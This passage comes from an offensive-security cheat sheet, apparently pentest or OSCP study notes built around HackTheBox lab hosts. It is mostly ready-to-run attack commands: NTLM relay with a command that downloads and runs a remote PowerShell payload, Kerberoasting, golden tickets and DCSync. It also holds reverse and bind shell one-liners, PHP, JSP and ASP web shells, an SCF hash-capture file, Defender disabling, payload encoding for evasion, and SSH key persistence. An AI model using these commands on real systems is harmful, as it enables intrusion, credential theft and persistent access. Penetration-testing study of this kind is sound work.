2. Dump password hashes: `use auxiliary/scanner/ipmi/ipmi_dumphashes`
3. Crack with hashcat mode 7300
4. Default passwords: Dell iDRAC (`root:calvin`), HP iLO (`Administrator:random`), Supermicro (`ADMIN:ADMIN`)

### RDP (port 3389)

1. Security audit (without generating alerts): `rdp-sec-check.pl <IP>`
2. Connect: `xfreerdp /u:user /p:pass /v:<IP>`
3. If there are special characters: escape them with `\`

### WinRM (ports 5985/5986)

1. Check if user is member of Remote Management Users: `netexec winrm <IP> -u user -p pass`
2. If "pwned": `evil-winrm -u user -p pass`

---

## LLMNR / NBT-NS Poisoning

**How it works:**
1. A host tries to connect to `\\printer01.inlanefreight.local` (mistyped)
2. DNS responds: unknown
3. The host broadcasts a question on the local network
4. Responder (attacker) responds: "that's me"
5. The host sends NTLM credentials to the attacker

**Usage:**
```bash
sudo responder -I ens224
```

Captured hashes are NTLMv2 → crackable with hashcat mode 5600, but **cannot be used for Pass-the-Hash**.

**Remediation:** Disable LLMNR and NBT-NS in Active Directory.

---

## SAMBA Relay

**Prerequisites:**
- SMB signing must be enabled but NOT required
- Must be on the local network
- User credentials must have remote access

**Flow:**
1. Attacker sets up a fake SMB server (Responder)
2. When a user tries to access a nonexistent SMB resource, their NTLM credentials arrive at the attacker
3. They can be cracked offline (not usable for PTH)

```bash
python3 Responder.py -I eth0 -rdw
john --wordlist=rockyou.txt hashes
```

---

## NTLM Relay

**Prerequisites:** Same as SAMBA Relay.

### IPv4

**Flow:**
1. Disable SMB and HTTP in Responder.conf
2. Create list of target IPs (`targets.txt`)
3. Launch Responder and ntlmrelayx simultaneously
4. When someone authenticates, relay attempts credentials on target machines and dumps SAM if admin

```bash
python3 Responder.py -I eth0 -rdw
ntlmrelayx.py -tf targets.txt -smb2support
```

To get reverse shell directly:
```bash
# Set up Python server and listener
python3 -m http.server 8000
rlwrap nc -nlvp 4646
# Launch ntlmrelayx with command
ntlmrelayx.py -tf targets.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/revshell.ps1')"
```

### IPv6

Windows requests IPv6 traffic by default. If IPv4 is patched, IPv6 may not be.

```bash
mitm6 -d domain.local
ntlmrelayx.py -6 -wh 10.10.10.10 -t smb://10.10.10.15 -socks -debug -smb2support
```

After getting admin relay → configure `/etc/proxychains.conf` with `socks4 127.0.0.1 1080` → connect without needing real password.

---

## AS-REP Roasting

**Prerequisite:** Only need a list of users. The attack works against accounts with `UF_DONT_REQUIRE_PREAUTH` enabled.

> Sync clock with DC: `sudo ntpdate <DC_IP>`

**Flow:**
1. Request TGT without pre-authentication for users in the list
2. Those that allow it return an encrypted hash
3. Crack the hash offline

```bash
impacket-GetNPUsers domain.htb/ -no-pass -usersfile users.txt
```

With Rubeus (from Windows):
```
Rubeus.exe asreproast /user:user /domain:domain.local /dc:<hostname>
```

Crack:
```bash
hashcat -a 0 -m 18200 hash.txt rockyou.txt
john --wordlist=rockyou.txt hash.txt
```

---

## Kerberoasting

**Prerequisite:** Valid credentials of any domain user.

**Concept:** Accounts with SPN (Service Principal Name) have a TGS ticket whose hash contains the service password. It can be requested and cracked offline.

> Sync clock with DC: `sudo ntpdate <DC_IP>`

Is a lateral movement/privilege escalation technique in Active Directory. This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account.

Any domain user can request a Kerberos ticket for any service account in the same domain.

All you need is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using runas /netonly.

TGS tickets take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.

### From Linux — GetUserSPNs.py

Install impacket: https://github.com/SecureAuthCorp/impacket

```bash
sudo python3 -m pip install .
```

Listing SPN Accounts:
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

Requesting all TGS Tickets:
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```

Requesting a single ticket:
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

Saving the TGS Ticket to an Output File:
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

Cracking the ticket offline with hashcat:
```bash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

Testing Authentication against a Domain Controller:
```bash
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

Basic usage:
```bash
# Check for vulnerable accounts
impacket-GetUserSPNs domain.htb/user:password

# Get the hashes
impacket-GetUserSPNs domain.htb/user:password -request

# Crack
john -w:rockyou.txt hash
hashcat -a 0 -m 13100 hash.txt rockyou.txt
```

### From Windows — setspn.exe

Enumerating SPNs:
```powershell
setspn.exe -Q */*
```

Target a single user:
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

- `Add-Type`: Is used to add a .NET framework class to our powershell session.
- `-AssemblyName`: Allow us to indicate an assembly that contains types that we are intested in using
- `System.IdentityModel`: Is a namespace that contains different classes for building security token services.
- `New-Object`: Create a instance of .NET framework object.
- `System.IdentityModel.Tokens and KerberosRequestorSecurityToken`: Allow us to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current login.

Retrieving all tickets using setspn.exe:
```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

### Extracting Tickets from Memory with Mimikatz

Now that the tickets are loaded, we can use `Mimikatz` to extract the ticket(s) from `memory`.

- `base64 /out:true`: If we don't identify this command, mimikatz will extract the tickets and write them to `.kirbi` files.
- `kerberos::list /export`: Export all the tickets

Preparing the base64 blob for cracking:
```bash
echo "<base64 blob>" |  tr -d \\n
```

Convert to .kirbi file:
```bash
cat encoded_file | base64 -d > sqldev.kirbi
```

kirbi2john.py:
```bash
python2.7 kirbi2john.py sqldev.kirbi
```

Modifying crack_file for Hashcat:
```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

Cracking the hash with hashcat:
```bash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

### Automated / Tool Based Routes (Windows)

Enumerate the SPN accounts with PowerView:
```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```

PowerView to target a specific user:
```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

Export all tickets to a CSV file:
```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

With Rubeus:
```powershell
.\Rubeus.exe kerberoast /stats
```

```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

We use `/nowrap` flag to copied the hash more easily for offline cracking.

With Rubeus (basic):
```
Rubeus.exe kerberoast /creduser:s4vicorp.local\user /credpassword:password
```

---

## Golden Ticket Attack

**Prerequisites:**
- NTLM hash of the `krbtgt` user
- Domain SID
- Domain name
- Target user RID

**Concept:** With the `krbtgt` hash, a fake TGT can be created that grants access to all domain resources, even if the user changes their password.

**Flow:**

1. Get krbtgt data with mimikatz:
```
lsadump::lsa /inject /name:krbtgt
```

2. Create the golden ticket:
```
kerberos::golden /domain:domain.local /sid:<sid_krbtgt> /rc4:<hash_ntlm> /user:Administrator /ticket:golden.kirbi
```

3. Pass The Ticket (apply the ticket):
```
kerberos::ptt golden.kirbi
dir \\<hostname_DC>\c$
```

**Alternative with impacket:**
```bash
impacket-ticketer -nthash <hash_krbtgt> -domain-sid S-1-5... -domain domain.local Administrator
export KRB5CCNAME="/path/Administrator.ccache"
psexec.py -n -k domain.local/Administrator@<DC-hostname> cmd.exe
```

**Transfer ticket between machines:**
```bash
# Attacker: SMB server
impacket-smbserver smbFolder $(pwd) -smb2support

# Windows: copy ticket
copy golden.kirbi \\<attacker_ip>\smbFolder\golden.kirbi
```

---

## DCSync

Get NTLM hashes of all domain users using the AD replication protocol.

```bash
# With impacket (requires replication permissions or be domain admin)
impacket-secretsdump domain.local/Administrator:'password'@<DC_IP>
```

---

## SCF Files (SMB Hash Capture)

If you have write permissions on an SMB share, you can create an `.scf` file that makes Windows load an icon from a UNC path (your machine), capturing the NTLM hash of anyone who opens the folder.

Content of `@file.scf` (the `@` makes it appear at the top of the directory):
```
[SHELL]
Command=2
IconFile=\\<attacker_ip>\smbFolder\malicious.ico
[Taskbar]
Command=ToggleDesktop
```

```bash
# Upload the file
smbclient //<IP>/share -U user -c 'put file.scf'

# Start Samba server on attacker to capture the hash
impacket-smbserver smbFolder $(pwd) -smb2support
```

---

## Abusing GPP Passwords

If you have access to the Domain Controller's `SYSVOL` resource, look for the `Groups.xml` file inside `Policies/`.

```bash
smbmap -H 10.10.10.10 -r Policies/{31B...-5661...}/MACHINE/Preferences/Groups/Groups.xml
```

The `cpassword` field contains the password encrypted with AES-32, but Microsoft published the key — it can be decrypted directly:

```bash
gpp-decrypt <cpassword_value>
```

---

## Password Spraying

**Considerations:**
- Know the password policy BEFORE spraying to avoid locking accounts
- If you don't know it, wait several hours between attempts
- `badPwdCount` in crackmapexec shows the failed attempt counter

**Password policy enumeration:**
```bash
crackmapexec smb <IP> -u user -p pass --pass-pol
rpcclient -U "" -N <IP> → querydominfo → getdompwinfo
enum4linux -P <IP>
net accounts    # from Windows
```

**Spraying from Linux:**
```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

**Spraying from Windows (DomainPasswordSpray):**
```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

**Local administrator password reuse:**
```bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H <hash> | grep +
```

The `--local-auth` flag attempts login once per machine, avoiding lockouts.

---

## Windows Privilege Escalation

### Checklist

1. **Autologin:** `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` — look for `DefaultUserName` and `DefaultPassword`
2. **Scheduled Tasks:** `schtasks /query /fo LIST /v` — tasks with editable paths
3. **Vulnerable services:** service binaries with write permissions for the current user
4. **Exposed credentials:** configuration files, logs, PowerShell history (`PSReadLine`)
5. **Vulnerable software:** `C:\Program Files` — look for versions with known exploits
6. **Kernel exploits:** compare Windows version with known CVEs
7. **Password reuse:** use found credentials on other accounts/services
8. **AlwaysInstallElevated:** `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
9. **SeImpersonatePrivilege / SeAssignPrimaryToken:** Juicy Potato / PrintSpoofer

### Enumeration Scripts

- **WinPEAS**: full enumeration
- **Seatbelt**: security check
- **JAWS**: PowerShell script
- **PowerUp.ps1**: [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

---

## Linux Privilege Escalation

### Checklist

1. **Sudo:** `sudo -l` → look at [GTFOBins](https://gtfobins.org/)
2. **SUID binaries:** `find / -perm -4000 -type f 2>/dev/null` → check GTFOBins
3. **Capabilities:** `getcap -r / 2>/dev/null`
4. **Cron jobs:** check `/etc/crontab`, `/etc/cron.d`, `/var/spool/cron/crontabs/root` — editable files
5. **SSH keys:** look for `id_rsa` in `/home/*/.ssh/` and `/root/.ssh/` — if readable, you can authenticate
6. **Exposed credentials:** config files, logs, `.bash_history`
7. **Vulnerable software:** `dpkg -l` → look for CVEs
8. **Kernel exploits:** search CVE by kernel version (`uname -r`) — e.g.: DirtyCow CVE-2016-5195
9. **Password reuse**
10. **NFS no_root_squash:** mount share and create SUID binary
11. **Automated tools:** LinPeas, LinEnum, linuxprivchecker

### Add Public Key (persistence)

```bash
ssh-keygen -f key
echo "ssh-rsa AAAA...= user@parrot" >> /root/.ssh/authorized_keys
ssh root@10.10.10.10 -i key
```

---

## Pivoting - Strategy

### When to Use Each Tool

| Scenario | Recommended Tool |
|----------|-----------------|
| Fast, clean pivot | **Ligolo-ng** (recommended for OSCP) |
| Only SSH available | `ssh -D 9050` + proxychains |
| SSH available, full network | **sshuttle** (more transparent than proxychains) |
| Only HTTP/HTTPS outbound | **Chisel** (reverse tunnel) |
| Windows, native tools | **Netsh** (port forwarding) or **plink.exe** |
| Firewall blocks ICMP | **Ptunnel-ng** (encapsulates in ICMP) |
| Firewall blocks everything except DNS | **DNScat2** |
| Double or triple pivot | Ligolo-ng + routes or metasploit autoroute |

### General Pivoting Flow

1. Check interfaces on compromised host: `ip route` (Linux) / `netstat -r` (Windows)
2. Identify internal subnets the pivot has access to
3. Ping sweep to discover hosts: `for i in {1..254}; do ping -c1 172.16.5.$i & done | grep from`
4. Choose pivoting method based on available tools
5. Configure proxychains or routes according to method
6. Scan internal hosts: `proxychains nmap -Pn -sT 172.16.5.19`

> Ping sweep may fail on first attempt due to ARP cache — try at least twice.

---

## Active Directory Enumeration

### Initial Enumeration Flow

1. Null session SMB/RPC → users, groups, password policy
2. LDAP anonymous bind → same info
3. Kerberos brute force (kerbrute) → valid users without generating logs
4. With credentials → BloodHound to understand relationships

### With BloodHound

1. Run SharpHound on Windows: `Invoke-BloodHound -CollectionMethod All`
2. Download the ZIP: `download "C:/Windows/Temp/test/*.zip" bloodhound.zip`
3. Start neo4j: `neo4j console`
4. Start BloodHound: `bloodhound &`
5. Upload the ZIP → Analysis → look for paths to Domain Admin

### Identify Vulnerabilities from SYSTEM

With `NT AUTHORITY\SYSTEM` on a domain machine, the computer can be impersonated to get DC information:

- Perform Kerberoasting / AS-REP Roasting
- Run Inveigh to capture Net-NTLMv2 hashes
- Impersonate privileged user tokens
- Perform ACL attacks

---

## Enumerating Password Policy

```bash
# With SMB credentials
crackmapexec smb <IP> -u user -p pass --pass-pol

# RPC null session
rpcclient -U "" -N <IP>
querydominfo
getdompwinfo

# enum4linux
enum4linux -P <IP>
enum4linux-ng -P <IP> -oA output

# LDAP anonymous
ldapsearch -h <IP> -x -b "DC=DOMAIN,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# Windows native
net accounts
```

---

## Enumerating Domain Users

```bash
# SMB null session
enum4linux -U <IP> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
rpcclient -U "" -N <IP> → enumdomusers
crackmapexec smb <IP> --users

# LDAP anonymous
ldapsearch -h <IP> -x -b "DC=DOMAIN,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
./windapsearch.py --dc-ip <IP> -u "" -U

# Kerberos (no credentials, no logs)
kerbrute userenum -d inlanefreight.local --dc <IP> /opt/jsmith.txt

# With credentials
crackmapexec smb <IP> -u user -p pass --users
```

---

## Web Enumeration

### First Look

1. Open Burp Suite before visiting the site
2. Check `robots.txt` and `sitemap.xml`
3. Open Developer Console
4. View source code
5. Identify technologies with Wappalyzer or WhatWeb

### Important Files/Paths to Check

- `robots.txt`
- `sitemap.xml`
- `/.well-known/security.txt`
- `/.well-known/change-password`
- `/.well-known/openid-configuration`
- `/.well-known/assetlinks.json`

### Active Enumeration

```bash
# Banner/technology
curl -IL https://www.inlanefreight.com
whatweb --no-errors 10.10.10.0/24

# Directories
gobuster dir -u https://<IP>/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

# Subdomains/vhosts
gobuster vhost -u http://<IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb"
```

### Web Crawling

```bash
pip3 install scrapy
wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
unzip ReconSpider.zip
python3 ReconSpider.py http://inlanefreight.com
```

EyeWitness for screenshots: https://github.com/RedSiege/EyeWitness

---

## Squid Proxy

If you find a Squid proxy (port 3128):

1. Add to proxychains:
```
http 10.10.10.224 3128
```

2. Scan with nmap through the proxy:
```bash
proxychains -q nmap -sT -Pn -v -n 127.0.0.1 -oN allPortsSquidProxy
```

3. If you find another port 3128 on an internal host (internal proxy):
```
http 127.0.0.1 3128
```

4. If the scan is slow, use a custom bash script:
```bash
#!/usr/bin/env bash
for port in $(seq 1 65525); do
    proxychains -q timeout 1 bash -c "echo '' > /dev/tcp/10.197.243.77/$port" 2>/dev/null && echo "[+] $port - OPEN" &
done; wait
```

5. Internal host scan on specific ranges:
```bash
#!/usr/bin/env bash
for port in 21 22 25 53 80 88 443 445 8080 8081; do
    for i in $(seq 1 254); do
        proxychains -q timeout 1 bash -c "echo '' > /dev/tcp/10.241.251.$i/$port" 2>/dev/null && echo "[+] Port $port - OPEN on host 10.241.251.$i" &
    done
done; wait
```

---

## Virtual Hosting

When a server manages multiple domains via the `Host` header. If you find an IP, there may be other sites on the same server.

1. Add the known hostname to `/etc/hosts`
2. Fuzz vhosts with gobuster or ffuf
3. If you find a new vhost, add it to `/etc/hosts` too

If the service is on a non-standard port:
```bash
gobuster vhost -u http://inlanefreight.htb:1234 -w ...
```

---

## Common Scenarios

### Scenario 1: No Credentials — Discover and Move
Standard checks (SMB null, LDAP anonymous) yield nothing → Kerbrute with jsmith.txt combined with LinkedIn → password spray with "Welcome1" → hits on two low-privilege users → BloodHound → find path to Domain Admin.

### Scenario 2: Non-Standard Username Format
LinkedIn and GitHub return nothing. Search for PDFs published by the company → metadata reveals GUID format `F9L8` (4 chars, A-Z0-9). Generate wordlist:
```bash
for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}
    do echo $x;
done
```
Kerbrute finds valid accounts → continue with RBCD or Shadow Credentials attack.

---

## Pentest Guidelines

### Suggested Order of Operations

1. **External passive reconnaissance** — OSINT, DNS, subdomains, WHOIS, breaches
2. **Active reconnaissance** — ping sweep, nmap, banner grabbing
3. **User enumeration** — LDAP, RPC, Kerberos, SMB null sessions, scraping
4. **Password policy enumeration** — before any spraying
5. **Security controls** — Defender, AppLocker, LAPS (if credentials available)
6. **Password spraying** — with known policy to avoid account lockouts
7. **With credentials** → BloodHound, Kerberoasting, ACL attacks
8. **Privilege escalation** — local → domain admin → forest

### Key Notes

- CMD does not save command history, PowerShell does (PSReadLine)
- Execution Policy and UAC affect PowerShell but not CMD
- A local SYSTEM can impersonate the computer object and communicate with AD
- If you find the domain name: add it to `/etc/hosts`
- When password spraying: `--local-auth` in CME to avoid lockouts
- Always sync clock with DC before Kerberos attacks: `sudo ntpdate <DC_IP>`

### Useful Resources

- [GTFOBins](https://gtfobins.org/) — Linux SUID/sudo/capabilities
- [LOLBAS](https://lolbas-project.github.io/#) — Windows living-off-the-land
- [WADComs](https://wadcoms.github.io/) — interactive cheatsheet for AD/Windows offensive tools
- [HackTricks LDAP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html)
- [Oracle SQL Commands](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm)
- [John Hash Formats](https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats)
- [Harmj0y PowerShell cradles](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)
- [BloodHound Cypher Cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)

### Default Passwords to Try

- `admin:admin`
- `root:root`
- `user:password`
- Always search for product-specific credentials on Google

### Protocol Command Tables

**POP3:**
| Command | Description |
|---------|-------------|
| `USER username` | Identify user |
| `PASS password` | Authenticate |
| `STAT` | Number of stored emails |
| `LIST` | Number and size of all emails |
| `RETR id` | Get email by ID |
| `DELE id` | Delete email by ID |
| `QUIT` | Close connection |

**IMAP:**
| Command | Description |
|---------|-------------|
| `1 LOGIN username password` | Login |
| `1 LIST "" *` | List directories |
| `1 SELECT INBOX_NAME` | Select mailbox |
| `1 FETCH <ID> all` | Get message metadata |
| `1 FETCH <ID> BODY[]` | Get email body |
| `1 LOGOUT` | Close connection |

**FTP:**
- `cd` / `ls` / `ls -la` / `ls -R` / `get file` / `prompt; mget *` / `put file` / `status` / `exit`

**R-services (ports 512, 513, 514):**
```bash
rlogin 10.0.17.2 -l htb-student
rwho
rusers -al 10.0.17.5
```

---

## NFS — Privilege Escalation

If `root_squash` is not configured, it's possible to create a SUID binary on the mounted share:

1. Mount NFS share: `sudo mount -t nfs <IP>:/ ./target-NFS/ -o nolock`
2. List UIDs/GIDs: `ls -n ./target-NFS/`
3. If there's a user UID without `root_squash`, create shell with that UID and setuid bit
4. Execute the shell via SSH as that user to get privileges

---

## SMTP — Enumeration Methodology

1. Banner grabbing: `nc -nv <IP> 25` or `telnet <IP> 25`
2. Enumerate users: `smtp-user-enum -M VRFY -U users.txt -t <IP>`
3. Detect open relay: `nmap -p25 --script smtp-open-relay -v <IP>`
4. If open relay — possible internal phishing email sending

---

## IPMI — Attack Procedure

1. Detect IPMI: `nmap -sU --script ipmi-version -p 623 <IP>`
2. Dump hashes with Metasploit: `use auxiliary/scanner/ipmi/ipmi_dumphashes`
3. Crack hash: `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u`
4. Access BMC web console with obtained credentials
5. BMC credentials are often reused on other systems

---

## SSH with Kerberos

If SSH rejects password and shows `Permission denied (gssapi-keyex,gssapi-with-mic,password)`:

1. Install `krb5-config` if it doesn't exist: `dpkg-reconfigure krb5-config`
2. Configure `/etc/krb5.conf`:
```
[libdefaults]
    default_realm = REALM.HTB
[realms]
    REALM.HTB = {
        kdc = srv01.realm.htb
    }
[domain_realm]
    .REALM.HTB = REALM.HTB
    REALM.HTB = REALM.HTB
```
3. Get ticket:
```bash
sudo kdestroy
sudo kinit <username>
sudo klist
```
4. Connect: `sudo ssh -o GSSAPIAuthentication=yes user@10.10.10.x`

---

## Security Controls Enumeration

**Windows Defender:**
```powershell
Get-MpComputerStatus | select RealTimeProtectionEnabled    # True = active
Set-MpPreference -DisableRealtimeMonitoring $true          # disable (requires admin)
```

**AppLocker:**
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
# If it blocks PowerShell.exe, try alternative paths:
# %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
# PowerShell_ISE.exe
```

**PowerShell Constrained Language Mode:**
```powershell
$ExecutionContext.SessionState.LanguageMode    # FullLanguage vs ConstrainedLanguage
```

**LAPS:**
```powershell
Find-LAPSDelegatedGroups       # groups with read permissions
Find-AdmPwdExtendedRights      # users with "All Extended Rights"
Get-LAPSComputers              # list computers with LAPS + passwords (if access)
```

---

## Credentialed Enumeration

With low-privilege domain user credentials:

**CrackMapExec:**
```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --loggedon-users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
# Results in: /tmp/cme_spider_plus/<IP>/
```

**SMBMap with credentials:**
```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

---

## Shells and Payloads — Strategy

**Bind Shell** (victim listens, you connect):
```bash
# Linux victim:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f

# Windows victim (PowerShell):
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();...

# Connect from attacker:
nc 10.10.10.1 1234
```

**Reverse Shell** (victim connects to you):
```bash
# Linux bash:
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

# Linux with old nc:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f

# Windows PowerShell:
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);..."

# PHP:
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'"); ?>

# Listener:
nc -nlvp 443
rlwrap nc -nlvp 4646
```

**Web Shells:**
```php
<?php system($_REQUEST["cmd"]); ?>     # PHP
```
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>   # JSP
```
```asp
<% eval request("cmd") %>             # ASP
```

**Resources:** https://www.revshells.com/

---

## TTY Upgrade — Procedure

```bash
# Step 1 — spawn shell:
script /dev/null -c bash
# or: python -c 'import pty; pty.spawn("/bin/bash")'

# Step 2 — suspend:
Ctrl+Z

# Step 3 — configure stty:
stty raw -echo; fg

# Step 4 — restore terminal:
reset xterm
export TERM=xterm

# Step 5 — adjust size (get from your local terminal):
stty size          # e.g.: 67 318
stty rows 67 columns 318    # on victim shell
```

---

## Metasploit — Advanced Workflow

**Database management:**
```bash
sudo systemctl start postgresql
sudo msfdb init
msfconsole -q
db_import Target.xml          # import nmap XML scan
db_nmap -sV -sS 10.10.10.8   # nmap from msf with DB storage
hosts -h                      # view hosts
services -h                   # view services
creds -h                      # credentials
loot -h                       # obtained hashes
workspace -a Target_1         # create workspace
```

**Encoders and evasion:**
```bash
# Generate payload with encoder:
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai

# Analyze with VirusTotal:
msf-virustotal -k <API_key> -f payload.exe
```

**Session management:**
```bash
Ctrl+Z          # put session in background
sessions        # list active sessions
sessions -i 1   # resume session
sessions -u 1   # upgrade to meterpreter
exploit -j      # launch as background job
jobs -h         # manage jobs
kill <n>        # kill job
```

**Meterpreter — key commands:**
```bash
getuid                          # current user
ps                              # processes
steal_token <PID>              # steal process token
migrate <PID>                  # migrate process
hashdump                       # dump SAM hashes
lsa_dump_sam                   # SAM dump
lsa_dump_secrets               # LSA secrets
db_nmap -sV -p- -T5 172.16.5.19   # nmap from meterpreter
run post/multi/recon/local_exploit_suggester   # find privesc
run autoroute -s 172.16.5.0/23    # add route
portfwd add -l 3300 -p 3389 -r 172.16.5.19    # port forward
```

---

## Advanced Pivoting — Strategy

**Technique selection by scenario:**

| Scenario | Recommended Technique |
|----------|-----------------------|
| Linux pivot with SSH | Ligolo-ng or SSH dynamic forwarding |
| Windows pivot without SSH | Chisel reverse |
| Firewall blocks TCP | DNScat2 (DNS tunneling) |
| Firewall blocks TCP/UDP | ptunnel-ng (ICMP tunneling) |
| RDP access to Windows pivot | SocksOverRDP + Proxifier |
| Legacy Windows pivot | plink.exe + Proxifier |
| Meterpreter access | autoroute + socks_proxy |

**Ping Sweep:**
```bash
# Linux:
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done

# Windows CMD:
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# PowerShell:
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}

# Meterpreter:
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

**SSH Tunneling:**
```bash
# Local port forward:
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64

# Dynamic (SOCKS):
ssh -D 9050 ubuntu@10.129.202.64

# Remote/Reverse:
ssh -R <PivotIP>:8080:0.0.0.0:8000 ubuntu@<TargetIP> -vN
```

**Metasploit pivot:**
```bash
use auxiliary/server/socks_proxy
set SRVPORT 9050; set SRVHOST 0.0.0.0; set version 4a; run

# In meterpreter session:
run autoroute -s 172.16.5.0/23
portfwd add -l 3300 -p 3389 -r 172.16.5.19
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18    # reverse portfwd
```

---

## Password Spraying Scenarios

**Scenario 1:** No null session or anonymous LDAP.
- Use Kerbrute with user list (`jsmith.txt` + LinkedIn scraping)
- Spraying with `Welcome1` → hits on low-priv users → run BloodHound

**Scenario 2:** External lists don't work.
- Search for PDFs published by the organization → username format in metadata
- Generate usernames: `for x in {{A..Z},{0..9}}{{A..Z},{0..9}}...; do echo $x; done`
- Kerbrute + credentials → RBCD or Shadow Credentials

---

## Local Administrator Password Reuse

If you obtain an NTLM hash or local admin password, it may be reused across multiple hosts:

```bash
# Spraying with NTLM hash (--local-auth avoids lockout — only 1 attempt per host):
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

Common patterns: `$desktop%@admin123` (workstations), `$server%@admin123` (servers).

---

## Living Off the Land

Basic commands

### Windows Enumeration Commands

| Command                                                 | Description                                                                                |
| :------------------------------------------------------ | :----------------------------------------------------------------------------------------- |
| `hostname`                                              | Prints the PC's name                                                                       |
